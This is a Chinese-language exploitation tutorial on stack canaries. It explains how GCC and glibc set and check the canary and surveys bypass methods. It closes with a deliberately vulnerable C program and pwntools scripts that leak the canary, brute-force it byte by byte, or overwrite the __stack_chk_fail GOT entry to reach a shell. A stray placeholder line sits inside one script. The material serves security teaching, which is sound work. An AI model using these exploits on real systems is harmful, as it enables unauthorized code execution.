
# Canary

## **0.Introduction** 
由于stack overflow而引发的攻击非常普遍也非常古老, 相应地一种叫做canary的 mitigation技术很早就出现在gcc/glibc里, 直到现在也作为系统安全的第一道防线存在。

canary不管是实现还是设计思想都比较简单高效, 就是插入一个值, 在stack overflow发生的 高危区域的尾部, 当函数返回之时检测canary的值是否经过了改变, 以此来判断stack/buffer overflow是否发生.

Canary与windows下的GS保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了linux下保护机制的标配

<!-- more -->

## **1.Canary 原理**
### **1.1在GCC中使用Canary**
可以在GCC中使用以下参数设置Canary:

```cpp
-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护
-fstack-protector-all 启用保护，为所有函数插入保护
-fstack-protector-strong
-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护
-fno-stack-protector 禁用保护.
```

### **1.2Canary实现原理**

开启Canary保护的stack结构大概如下

```
        High
        Address |                 |
                +-----------------+
                | args            |
                +-----------------+
                | return address  |
                +-----------------+
        rbp =>  | old ebp         |
                +-----------------+
      rbp-8 =>  | canary value    |
                +-----------------+
                | 局部变量        |
        Low     |                 |
        Address

```
当程序启用Canary编译后，在函数序言部分会取fs寄存器0x28处的值，存放在栈中%ebp-0x8的位置。
这个操作即为向栈中插入Canary值，代码如下：
``` 
mov    rax, qword ptr fs:[0x28]
mov    qword ptr [rbp - 8], rax
```

在函数返回之前，会将该值取出，并与fs:0x28的值进行异或。如果抑或的结果为0，说明canary未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。

```
mov    rdx,QWORD PTR [rbp-0x8]
xor    rdx,QWORD PTR fs:0x28
je     0x4005d7 <main+65>
call   0x400460 <__stack_chk_fail@plt>
```

如果canary已经被非法修改，此时程序流程会走到__stack_chk_fail。__stack_chk_fail也是位于glibc中的函数，默认情况下经过ELF的延迟绑定，定义如下。

```
eglibc-2.19/debug/stack_chk_fail.c

void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}

void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```

这意味可以通过劫持__stack_chk_fail的got值劫持流程或者利用__stack_chk_fail泄漏内容(参见stack smash)。

进一步，对于Linux来说，fs寄存器实际指向的是当前栈的TLS结构，fs:0x28指向的正是stack_guard。
```
typedef struct
{
  void *tcb;        /* Pointer to the TCB.  Not necessarily the
                       thread descriptor used by libpthread.  */
  dtv_t *dtv;
  void *self;       /* Pointer to the thread descriptor.  */
  int multiple_threads;
  uintptr_t sysinfo;
  uintptr_t stack_guard;
  ...
} tcbhead_t;
```
如果存在溢出可以覆盖位于TLS中保存的Canary值那么就可以实现绕过保护机制。

事实上，TLS中的值由函数security_init进行初始化。

```
static void
security_init (void)
{
  // _dl_random的值在进入这个函数的时候就已经由kernel写入.
  // glibc直接使用了_dl_random的值并没有给赋值
  // 如果不采用这种模式, glibc也可以自己产生随机数

  //将_dl_random的最后一个字节设置为0x0
  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);
  
  // 设置Canary的值到TLS中
  THREAD_SET_STACK_GUARD (stack_chk_guard);

  _dl_random = NULL;
}

//THREAD_SET_STACK_GUARD宏用于设置TLS
#define THREAD_SET_STACK_GUARD(value) \
  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)

```


## **2.Canary绕过技术**

### **2.1 序言**
Canary是一种十分有效的解决栈溢出问题的漏洞缓解措施。但是并不意味着Canary就能够阻止所有的栈溢出利用，在这里给出了常见的存在Canary的栈溢出利用思路，请注意每种方法都有特定的环境要求。

### **2.2 泄露栈中的Canary**
Canary设计为以字节"\x00"结尾，本意是为了保证Canary可以截断字符串。
泄露栈中的Canary的思路是覆盖Canary的低字节，来打印出剩余的Canary部分。
这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露Canary，之后再次溢出控制执行流程。

### **2.3 one-by-one爆破Canary**

对于Canary，不仅每次进程重启后的Canary不同(相比GS，GS重启后是相同的)，而且同一个进程中的每个线程的Canary也不同。
但是存在一类通过fork函数开启子进程交互的题目，因为fork函数会直接拷贝父进程的内存，因此每次创建的子进程的Canary是相同的。我们可以利用这样的特点，彻底逐个字节将Canary爆破出来。
在著名的offset2libc绕过linux64bit的所有保护的文章中，作者就是利用这样的方式爆破得到的Canary:
这是爆破的Python代码:

```python
print "[+] Brute forcing stack canary "

start = len(p)
stop = len(p)+8

while len(p) < stop:
   for i in xrange(0,256):
      res = send2server(p + chr(i))

      if res != "":
         p = p + chr(i)
         #print "\t[+] Byte found 0x%02x" % i
         break

      if i == 255:
         print "[-] Exploit failed"
         sys.exit(-1)


canary = p[stop:start-1:-1].encode("hex")
print "   [+] SSP value is 0x%s" % canary
```


### **2.4劫持__stack_chk_fail函数**
已知Canary失败的处理逻辑会进入到stack_chk_failed函数，stack_chk_failed函数是一个普通的延迟绑定函数，可以通过修改GOT表劫持这个函数。

参见ZCTF2017 Login，利用方式是通过fsb漏洞篡改__stack_chk_fail的GOT表，再进行ROP利用

### **2.5覆盖TLS中储存的Canary值**

已知Canary储存在TLS中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的Canary和TLS储存的Canary实现绕过。


## **3.利用示例**

存在漏洞的示例源代码如下:

```cpp
// ex1.c
#include <stdio.h>
#include <unistd.h>
#include <string.h>
void getshell(void) {
    system("/bin/sh");
}
void init() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}
int main(void) {
    int i;
    init();
    char buf[100];
    for(i=0;i<2;i++){
        scanf("%s",&buf);
        printf(buf);
    }
    return 0;
}
```

编译为32bit程序，开启NX，ASLR，Canary保护
![-w600](media/15107152089668/15107154540302.jpg)

### **3.1泄露Canary示例**
首先通过覆盖Canary最后一个"\x00"字节来打印出4位的Canary
之后，计算好偏移，将Canary填入到相应的溢出位置，实现Ret到getshell函数中

```cpp
#!/usr/bin/env python

from pwn import *

context.binary = 'ex2'
#context.log_level = 'debug'
io = process('./ex2')

get_shell = 0x804859d

io.recvuntil("Hello Hacker!\n")

# leak Canary
payload = "A"*100
io.sendline(payload)

io.recvuntil("A"*100)
Canary = u32(io.recv(4))-0xa
log.info("Canary:"+hex(Canary))

# Bypass Canary
payload = "\x90"*100+p32(Canary)+"\x90"*12+p32(get_shell)
enter link description here
io.send(payload)

io.recv()
#io.recv()

io.interactive()
```


### **3.2劫持__stack_chk_fail示例**
在`__stack__chk_fail`函数的plt地址附近找到一条ret指令。
让程序即使出错也不abort，从而实现BOF利用，return 到getshell中即可。
我们已知`__stack__chk_fail`的plt地址为:0x8048450,在没有lazy binding前它中存放的应该时plt的一条指令的地址，我们就在这附近搜索，寻找ret指令，或者其他相关指令


在0x0804840E找到一条ret指令
我们利用格式化字符串漏洞更改got表为该地址即可

```python
#!/usr/bin/env python

from pwn import *

context.binary = 'ex2'
#context.log_level = 'debug'
io = process('./ex2')
elf =ELF('./ex2')

get_shell = 0x804859d
stack_failed_addr = elf.got['__stack_chk_fail']
log.info("stack_failed_addr:"+hex(stack_failed_addr))
io.recvuntil("Hello Hacker!\n")

# hijack GOT['__stack_chk_fail'] to ret
payload = p32(stack_failed_addr)+(0xE-0x4)*"A"+"%6$hhn"
io.sendline(payload)

io.recvline()

payload = "\x90"*116+p32(get_shell)

io.send(payload)

io.recv()
io.recv()

io.interactive()
```




